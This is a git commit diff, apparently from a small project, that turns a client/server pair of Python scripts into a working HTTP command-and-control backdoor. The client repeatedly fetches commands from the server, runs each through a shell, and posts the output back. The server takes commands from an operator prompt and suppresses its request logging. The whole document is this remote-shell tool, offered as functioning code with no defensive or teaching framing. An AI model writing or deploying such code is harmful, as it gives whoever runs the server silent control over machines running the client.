1bd160849073dc9800912f5626d4f5a693f8448c
rivodry <212361889+rivodry@users.noreply.github.com>
2025-08-14 13:28:52 +0530

    make it run

--- client/client.py
+++ client/client.py
@@ -1,9 +1,20 @@
 
 from urllib import request, parse
-
+import subprocess
 import time
-
+IP = "localhost"
+PORT=5000
+def returnoutput(data, url=f'http://{IP}:{PORT}'):
+    data = {"return": data}
+    data = parse.urlencode(data).encode()
+    req = request.Request(url, data=data)
+    request.urlopen(req)
+def run(command):
+     cmd = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+     returnoutput(cmd.stdout.read())
+     returnoutput(cmd.stderr.read())
 while True:
     command = request.urlopen(f"http://localhost:5000").read().decode()
     print(command)
+    run(command)
     time.sleep(1)
--- server/server.py
+++ server/server.py
@@ -1,14 +1,24 @@
 from http.server import BaseHTTPRequestHandler, HTTPServer
+from urllib.parse import parse_qs
 HTTP_STATUS_OK = 200
 IP = '0.0.0.0'
 PORT = 5000
 class ServerHandler(BaseHTTPRequestHandler):
+    def log_message(self,format,*args):
+        pass
     def do_GET(self):
         cmd = input(">")
         self.send_response(HTTP_STATUS_OK)
         self.send_header("Content-type","text/html")
         self.end_headers()
         self.wfile.write(cmd.encode())
+    def do_POST(self):
+        length = int(self.headers['Content-Length'])
+        self.send_response(200)
+        self.end_headers()
+        data = parse_qs(self.rfile.read(length).decode())
+        if "return" in data:
+            print(data["return"][0])
 if __name__== '__main__':
     ser = HTTPServer((IP,PORT),ServerHandler)
     try:
